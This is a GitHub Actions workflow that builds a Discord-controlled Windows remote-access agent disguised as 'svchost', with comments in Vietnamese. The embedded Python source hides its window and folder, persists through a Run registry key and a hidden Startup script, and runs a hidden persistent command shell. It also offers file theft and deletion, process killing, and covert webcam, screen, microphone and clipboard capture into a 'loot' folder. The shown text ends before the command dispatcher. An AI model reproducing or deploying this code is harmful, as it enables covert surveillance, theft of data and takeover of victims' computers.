name: Build svchost

on:
  workflow_dispatch:
    inputs:
      token:
        description: 'Discord Bot Token (dán vào đây)'
        required: true
        type: string
      run_minutes:
        description: 'Số phút chạy test trực tiếp (0 = bỏ qua)'
        required: false
        default: '5'
        type: string
      make_release:
        description: 'Tạo Release? (yes/no)'
        required: false
        default: 'yes'
        type: string

permissions:
  contents: write

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 30
    env:
      PYTHONIOENCODING: utf-8
      PYTHONUTF8: '1'

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Python 3.11
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
          architecture: 'x64'

      - name: Ghi agent.py
        shell: pwsh
        run: |
          $py = @'
          # ============================================================
          #   DISCORD REMOTE AGENT "svchost" - FULL +
          #   Ẩn + persist + tự hồi sinh + voice + shell + loot + đa máy
          # ============================================================
          import os, sys, io, time, json, socket, ctypes, zipfile, subprocess, threading, wave
          import base64, glob, shutil, tempfile, platform, datetime, queue, asyncio, re

          import discord

          # ---------------- CẤU HÌNH ----------------
          TOKEN       = "DAN_TOKEN_VAO_DAY"
          PREFIX      = "!"
          MACHINE_ID  = platform.node().split(".")[0][:20] or "PC"
          EXE_NAME    = "svchost.exe"
          RUN_KEY     = "svchost"
          INSTALL_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "Microsoft")
          SCRIPT_PATH = os.path.join(INSTALL_DIR, EXE_NAME)
          MARKER      = os.path.join(INSTALL_DIR, ".svc")
          LOOT_DIR    = os.path.join(INSTALL_DIR, "loot")

          # ---------------- THƯ VIỆN PHỤ ----------------
          def _imp(n):
              try: return __import__(n)
              except Exception: return None

          psutil = _imp("psutil"); cv2 = _imp("cv2"); mss = _imp("mss")
          pyautogui = _imp("pyautogui"); pyperclip = _imp("pyperclip")
          pynput = _imp("pynput"); requests = _imp("requests"); np = _imp("numpy")
          sd = _imp("sounddevice"); sf = _imp("soundfile"); sc = _imp("soundcard")
          try:
              from PIL import Image, ImageGrab
          except Exception:
              Image = ImageGrab = None

          os.makedirs(LOOT_DIR, exist_ok=True)
          NO_WIN = 0x08000000  # CREATE_NO_WINDOW

          # ============================================================
          #  NGỤY TRANG / PERSIST
          # ============================================================
          def self_path():
              return sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])

          def hide_console():
              try:
                  hwnd = ctypes.windll.kernel32.GetConsoleWindow()
                  if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
                  ctypes.windll.kernel32.SetConsoleTitleW("svchost")
              except Exception: pass

          def hide_folder(p):
              try: subprocess.call(f'attrib +h "{p}"', shell=True)
              except Exception: pass

          _sock = None
          def single_instance():
              global _sock
              _sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              try:
                  _sock.bind(("127.0.0.1", 47823)); _sock.listen(1); return True
              except OSError: return False

          def reg_set(name, value):
              import winreg
              k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                  r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
              winreg.SetValueEx(k, name, 0, winreg.REG_SZ, value); winreg.CloseKey(k)

          def reg_del(name):
              import winreg
              try:
                  k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                      r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                  winreg.DeleteValue(k, name); winreg.CloseKey(k)
              except Exception: pass

          def install():
              try:
                  os.makedirs(INSTALL_DIR, exist_ok=True)
                  me = self_path()
                  if os.path.normcase(me) != os.path.normcase(SCRIPT_PATH):
                      shutil.copy2(me, SCRIPT_PATH)
                  if getattr(sys, "frozen", False):
                      launch = f'"{SCRIPT_PATH}"'
                  else:
                      pyw = sys.executable
                      if pyw.lower().endswith("python.exe"):
                          pyw = pyw[:-len("python.exe")] + "pythonw.exe"
                      launch = f'"{pyw}" "{SCRIPT_PATH}"'
                  reg_set(RUN_KEY, launch)
                  startup = os.path.join(os.environ["APPDATA"],
                              r"Microsoft\Windows\Start Menu\Programs\Startup")
                  with open(os.path.join(startup, "svchost.vbs"), "w", encoding="utf-8") as f:
                      f.write(f'CreateObject("WScript.Shell").Run "{launch}", 0, False\n')
                  with open(MARKER, "w") as f: f.write("ok")
                  hide_folder(INSTALL_DIR)
              except Exception as e:
                  print("install:", e)

          def uninstall():
              reg_del(RUN_KEY)
              try:
                  v = os.path.join(os.environ["APPDATA"],
                      r"Microsoft\Windows\Start Menu\Programs\Startup\svchost.vbs")
                  if os.path.exists(v): os.remove(v)
              except Exception: pass

          # ============================================================
          #  HELPERS
          # ============================================================
          async def ex(fn, *a):
              return await client.loop.run_in_executor(None, lambda: fn(*a))

          async def send_long(message, text, lang=""):
              text = text or "[trống]"
              while text:
                  chunk, text = text[:1900], text[1900:]
                  await message.channel.send(f"```{lang}\n{chunk}\n```")

          def run_cmd(cmd, timeout=60):
              try:
                  out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
                                                timeout=timeout, creationflags=NO_WIN)
                  return out.decode("utf-8", errors="ignore") or "[không output]"
              except subprocess.CalledProcessError as e:
                  return e.output.decode("utf-8", errors="ignore")
              except Exception as e:
                  return f"[Lỗi] {e}"

          def human(n):
              for u in ("B","KB","MB","GB","TB"):
                  if n < 1024: return f"{n:.1f}{u}"
                  n /= 1024
              return f"{n:.1f}PB"

          def is_admin():
              try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
              except Exception: return False

          # ============================================================
          #  SHELL PHIÊN BỀN (giữ cd / set / biến)
          # ============================================================
          class Shell:
              def __init__(self):
                  self.lock = threading.Lock()
                  self.buf = bytearray()
                  self.cwd = os.path.expanduser("~")
                  self.proc = None
                  self._spawn()
              def _spawn(self):
                  self.proc = subprocess.Popen(
                      "cmd.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                      stderr=subprocess.STDOUT, cwd=self.cwd, bufsize=0,
                      creationflags=NO_WIN)
                  threading.Thread(target=self._reader, daemon=True).start()
                  try:
                      self.proc.stdin.write(b"@echo off\r\n"); self.proc.stdin.flush()
                      time.sleep(0.3)
                      self.buf.clear()
                  except Exception: pass
              def _reader(self):
                  while True:
                      try: chunk = os.read(self.proc.stdout.fileno(), 65536)
                      except Exception: break
                      if not chunk: break
                      self.buf += chunk
              def run(self, cmd, timeout=120):
                  with self.lock:
                      if self.proc.poll() is not None: self._spawn()
                      marker = "__SVC_9x7__"
                      self.buf.clear()
                      try:
                          self.proc.stdin.write((cmd + "\r\n").encode("utf-8", errors="ignore"))
                          self.proc.stdin.write(
                              ("echo " + marker + "%CD%" + marker + "\r\n").encode())
                          self.proc.stdin.flush()
                      except Exception:
                          self._spawn(); return "[shell đã khởi động lại]"
                      t0 = time.time()
                      while time.time() - t0 < timeout:
                          if marker.encode() in self.buf: break
                          if self.proc.poll() is not None: break
                          time.sleep(0.04)
                      data = self.buf.decode("utf-8", errors="ignore")
                      self.buf.clear()
                      if marker in data:
                          out, rest = data.split(marker, 1)
                          newcwd = rest.split(marker, 1)[0].strip()
                          if os.path.isdir(newcwd): self.cwd = newcwd
                          return out.strip() or "[ok]"
                      return (data.strip() or "[ok]") + "\n[chưa xong / timeout]"

          _shell = Shell()

          # ============================================================
          #  FILE
          # ============================================================
          def f_ls(path="."):
              path = os.path.expanduser(path or ".")
              if not os.path.exists(path): return f"Không tồn tại: {path}"
              if os.path.isfile(path): return f"{human(os.path.getsize(path))}  {path}"
              lines = [f"📁 {os.path.abspath(path)}"]
              try:
                  for e in sorted(os.scandir(path), key=lambda x: x.name.lower()):
                      try:
                          if e.is_dir(): lines.append(f"[DIR ] {e.name}")
                          else: lines.append(f"{human(e.stat().st_size):>8}  {e.name}")
                      except Exception: pass
              except Exception as e: return f"Lỗi: {e}"
              return "\n".join(lines[:300])

          def f_search(name, root="C:\\"):
              hits = []
              for dp, dns, fns in os.walk(root):
                  for f in fns:
                      if name.lower() in f.lower():
                          hits.append(os.path.join(dp, f))
                          if len(hits) >= 100: return "\n".join(hits)
              return "\n".join(hits) or "Không tìm thấy"

          def f_del(path):
              path = os.path.expanduser(path)
              try:
                  if os.path.isdir(path): shutil.rmtree(path)
                  else: os.remove(path)
                  return f"Đã xóa: {path}"
              except Exception as e: return f"Lỗi: {e}"

          def f_zip(path):
              path = os.path.expanduser(path)
              out = os.path.join(tempfile.gettempdir(), "dump.zip")
              with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
                  if os.path.isdir(path):
                      for dp, dns, fns in os.walk(path):
                          for f in fns:
                              fp = os.path.join(dp, f)
                              try: z.write(fp, os.path.relpath(fp, path))
                              except Exception: pass
                  else:
                      z.write(path, os.path.basename(path))
              return out

          def f_cat(path):
              path = os.path.expanduser(path)
              if not os.path.exists(path): return f"Không tồn tại: {path}"
              try:
                  with open(path, "r", encoding="utf-8", errors="ignore") as f:
                      return f.read()[:25000]
              except Exception as e: return f"Lỗi: {e}"

          def f_write(args):
              if len(args) < 2: return "Dùng: !write <path> <nội dung>"
              path = os.path.expanduser(args[0]); content = " ".join(args[1:])
              try:
                  with open(path, "w", encoding="utf-8") as f: f.write(content)
                  return f"Đã ghi {path} ({human(len(content))})"
              except Exception as e: return f"Lỗi: {e}"

          def f_mkdir(path):
              try: os.makedirs(os.path.expanduser(path), exist_ok=True); return f"Đã tạo {path}"
              except Exception as e: return f"Lỗi: {e}"

          def f_copy(args):
              try: shutil.copy2(os.path.expanduser(args[0]), os.path.expanduser(args[1])); return "Đã copy"
              except Exception as e: return f"Lỗi: {e}"

          def f_move(args):
              try: shutil.move(os.path.expanduser(args[0]), os.path.expanduser(args[1])); return "Đã move"
              except Exception as e: return f"Lỗi: {e}"

          def f_rename(args):
              try: os.rename(os.path.expanduser(args[0]), os.path.expanduser(args[1])); return "Đã đổi tên"
              except Exception as e: return f"Lỗi: {e}"

          def f_du(path):
              path = os.path.expanduser(path or ".")
              total = 0
              for dp, dn, fn in os.walk(path):
                  for f in fn:
                      try: total += os.path.getsize(os.path.join(dp, f))
                      except Exception: pass
              return f"{human(total)}  {os.path.abspath(path)}"

          def f_tree(path, depth=3):
              path = os.path.expanduser(path or ".")
              lines = []
              def walk(d, pre, lvl):
                  if lvl > int(depth): return
                  try: entries = sorted(os.scandir(d), key=lambda x: x.name.lower())
                  except Exception: return
                  for e in entries[:80]:
                      lines.append(f"{pre}{'📁 ' if e.is_dir() else '📄 '}{e.name}")
                      if e.is_dir(): walk(e.path, pre + "   ", lvl + 1)
              lines.append(f"📁 {os.path.abspath(path)}")
              walk(path, "   ", 1)
              return "\n".join(lines[:400])

          def f_hex(path):
              path = os.path.expanduser(path)
              try:
                  data = open(path, "rb").read(4096); out = []
                  for i in range(0, len(data), 16):
                      chunk = data[i:i+16]
                      h = " ".join(f"{b:02x}" for b in chunk)
                      t = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
                      out.append(f"{i:08x}  {h:<48}  {t}")
                  return "\n".join(out)
              except Exception as e: return f"Lỗi: {e}"

          # ============================================================
          #  HỆ THỐNG
          # ============================================================
          def f_sysinfo():
              if not psutil: return "Thiếu psutil"
              try: user = os.getlogin()
              except Exception: user = os.environ.get("USERNAME", "?")
              vm = psutil.virtual_memory(); du = psutil.disk_usage("C:\\")
              boot = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M")
              return (f"🖥️ Máy: {platform.node()} | User: {user} | Admin: {is_admin()}\n"
                      f"OS: {platform.system()} {platform.release()} ({platform.version()})\n"
                      f"CPU: {psutil.cpu_count()} nhân, dùng {psutil.cpu_percent()}%\n"
                      f"RAM: {human(vm.used)}/{human(vm.total)} ({vm.percent}%)\n"
                      f"Ổ C: {human(du.used)}/{human(du.total)} ({du.percent}%)\n"
                      f"Boot lúc: {boot}")

          def f_ps():
              if not psutil: return "Thiếu psutil"
              rows = []
              for p in psutil.process_iter(["pid","name","memory_info","cpu_percent"]):
                  try:
                      rows.append((p.info["cpu_percent"] or 0, p.info["pid"], p.info["name"],
                                   (p.info["memory_info"].rss if p.info["memory_info"] else 0)))
                  except Exception: pass
              rows.sort(reverse=True)
              return "\n".join(f"{c:5.1f}%  PID {pid:<7} {human(mem):>9}  {n}"
                               for c,pid,n,mem in rows[:80])

          def f_kill(target):
              if not psutil: return "Thiếu psutil"
              n = 0
              for p in psutil.process_iter(["pid","name"]):
                  try:
                      if target.lower() in (p.info["name"] or "").lower() or str(p.info["pid"]) == target:
                          p.kill(); n += 1
                  except Exception: pass
              return f"Đã tắt {n} tiến trình khớp '{target}'"

          def f_start(path):
              try: os.startfile(path); return f"Đã chạy: {path}"
              except Exception as e: return f"Lỗi: {e}"

          def f_power(action):
              a = action.lower()
              cmds = {"shutdown":"shutdown /s /t 3","restart":"shutdown /r /t 3",
                      "sleep":"rundll32.exe powrprof.dll,SetSuspendState 0,1,0",
                      "lock":"rundll32.exe user32.dll,LockWorkStation","logoff":"shutdown /l"}
              if a not in cmds: return "Chọn: shutdown|restart|sleep|lock|logoff"
              subprocess.Popen(cmds[a], shell=True, creationflags=NO_WIN); return f"Đang {a}..."

          def f_clip_set(text):
              if pyperclip: pyperclip.copy(text); return "Đã ghi clipboard"
              return "Thiếu pyperclip"

          def f_clip_get():
              if pyperclip: return pyperclip.paste() or "[trống]"
              return "Thiếu pyperclip"

          def f_msg(text):
              def _popup(): ctypes.windll.user32.MessageBoxW(0, text, "svchost", 0x40)
              threading.Thread(target=_popup, daemon=True).start(); return "Đã bật popup"

          def f_notify(text):
              ps = ('powershell -NoProfile -c "'
                    "[void][System.Reflection.Assembly]::LoadWithPartialName(\'System.Windows.Forms\');"
                    "$n = New-Object System.Windows.Forms.NotifyIcon;"
                    "$n.Icon = [System.Drawing.SystemIcons]::Information;"
                    "$n.Visible = $true;"
                    "$n.ShowBalloonTip(4000, \'svchost\', \'" + text + "\', 0);"
                    "Start-Sleep -Seconds 5; $n.Dispose()\"")
              subprocess.Popen(ps, shell=True, creationflags=NO_WIN); return "Đã gửi thông báo"

          def f_wall(path):
              try:
                  path = os.path.abspath(os.path.expanduser(path))
                  ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
                  return f"Đã đổi hình nền: {path}"
              except Exception as e: return f"Lỗi: {e}"

          def f_drives():
              out = []
              if psutil:
                  for p in psutil.disk_partitions():
                      try:
                          u = psutil.disk_usage(p.mountpoint)
                          out.append(f"{p.device}  {p.fstype}  {human(u.used)}/{human(u.total)} ({u.percent}%)")
                      except Exception: out.append(p.device)
              return "\n".join(out) or run_cmd("wmic logicaldisk get name,size,freespace")

          def f_env():
              return "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))

          def f_users(): return run_cmd("net user")
          def f_services():
              return run_cmd('powershell -NoProfile -c "Get-Service | Select Status,Name,DisplayName | Format-Table -AutoSize"')
          def f_startup():
              out = []
              for h in ("HKCU", "HKLM"):
                  out.append(run_cmd(f'reg query "{h}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"'))
              out.append("--- Startup folder ---")
              out.append(run_cmd('dir /b "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'))
              return "\n".join(out)
          def f_schedule():
              return run_cmd('schtasks /query /fo LIST | findstr /i "TaskName Status Next"')
          def f_uptime():
              if psutil:
                  up = time.time() - psutil.boot_time()
                  return f"Uptime: {int(up//86400)}d {int(up%86400//3600)}h {int(up%3600//60)}m"
              return run_cmd("net statistics workstation | findstr /i since")
          def f_battery():
              if psutil:
                  b = psutil.sensors_battery()
                  if b: return f"Pin: {b.percent}% | {'đang sạc' if b.power_plugged else 'đang dùng pin'}"
              return run_cmd("WMIC PATH Win32_Battery Get EstimatedChargeRemaining")
          def f_gpu(): return run_cmd("wmic path win32_VideoController get name,adapterram,driverversion /format:list")
          def f_av():
              return run_cmd('powershell -NoProfile -c "Get-CimInstance -Namespace root/SecurityCenter2 '
                             '-ClassName AntiVirusProduct | Select displayName,productState | Format-List"')
          def f_recycle():
              return run_cmd('powershell -NoProfile -c "Clear-RecycleBin -Force"') or "Đã dọn thùng rác"

          def f_installed():
              import winreg
              out = []
              for hive, path in [(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                                 (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")]:
                  try:
                      k = winreg.OpenKey(hive, path)
                      for i in range(winreg.QueryInfoKey(k)[0]):
                          try:
                              sk = winreg.OpenKey(k, winreg.EnumKey(k, i))
                              n = winreg.QueryValueEx(sk, "DisplayName")[0]
                              v = winreg.QueryValueEx(sk, "DisplayVersion")[0]
                              out.append(f"{n}  {v}")
                          except Exception: pass
                  except Exception: pass
              return "\n".join(sorted(set(out))) or "Không có"

          # ============================================================
          #  MEDIA
          # ============================================================
          def f_cam():
              if not cv2: return None
              cam = cv2.VideoCapture(0); time.sleep(1.2)
              ok, fr = cam.read(); cam.release()
              if not ok: return None
              p = os.path.join(LOOT_DIR, "cam.jpg"); cv2.imwrite(p, fr); return p

          def f_screen():
              if not ImageGrab: return None
              p = os.path.join(LOOT_DIR, "screen.png"); ImageGrab.grab().save(p); return p

          def f_monitors():
              if not mss: return []
              out = []
              with mss.mss() as s:
                  for i, m in enumerate(s.monitors):
                      if i == 0: continue
                      img = s.grab(m); p = os.path.join(LOOT_DIR, f"mon{i}.png")
                      mss.tools.to_png(img.rgb, img.size, output=p); out.append(p)
              return out

          def f_record(secs=10):
              if not (mss and cv2 and np): return None
              secs = min(int(secs), 60)
              p = os.path.join(LOOT_DIR, "record.mp4")
              with mss.mss() as s:
                  mon = s.monitors[1]; w, h = mon["width"], mon["height"]
                  vw = cv2.VideoWriter(p, cv2.VideoWriter_fourcc(*"mp4v"), 12, (w, h))
                  t0 = time.time()
                  while time.time() - t0 < secs:
                      frame = np.array(s.grab(mon))[:, :, :3]
                      vw.write(cv2.cvtColor(frame, cv2.COLOR_RGB2BGR))
                      time.sleep(1/12)
                  vw.release()
              return p

          def f_camgif(n=6):
              if not (cv2 and Image): return None
              cam = cv2.VideoCapture(0); frames = []
              for _ in range(n):
                  ok, fr = cam.read()
                  if ok:
                      fr = cv2.cvtColor(fr, cv2.COLOR_BGR2RGB)
                      frames.append(Image.fromarray(fr)); time.sleep(0.3)
              cam.release()
              if not frames: return None
              p = os.path.join(LOOT_DIR, "cam.gif")
              frames[0].save(p, save_all=True, append_images=frames[1:], duration=300, loop=0)
              return p

          def f_mic(secs=5):
              if not (sd and sf): return None
              secs = min(int(secs), 60)
              p = os.path.join(LOOT_DIR, "mic.wav")
              rec = sd.rec(int(secs*44100), samplerate=44100, channels=1); sd.wait()
              sf.write(p, rec, 44100); return p

          def f_speak(text):
              subprocess.Popen(
                  f'powershell -c "Add-Type -AssemblyName System.Speech;'
                  f'(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(\'{text}\')"',
                  shell=True, creationflags=NO_WIN)
              return "Đang nói..."

          def f_play(path):
              path = os.path.abspath(os.path.expanduser(path))
              if not os.path.exists(path): return f"Không thấy: {path}"
              if path.lower().endswith(".wav"):
                  import winsound
                  threading.Thread(target=lambda: winsound.PlaySound(path, winsound.SND_FILENAME),
                                   daemon=True).start()
              else:
                  subprocess.Popen(f'powershell -c "(New-Object Media.SoundPlayer \'{path}\').PlaySync()"',
                                   shell=True, creationflags=NO_WIN)
              return f"Đang phát: {path}"

          def f_beep():
              import winsound; winsound.MessageBeep(); return "🔔"

          def f_open(url):
              try: os.startfile(url); return f"Đã mở: {url}"
              except Exception as e: return f"Lỗi: {e}"

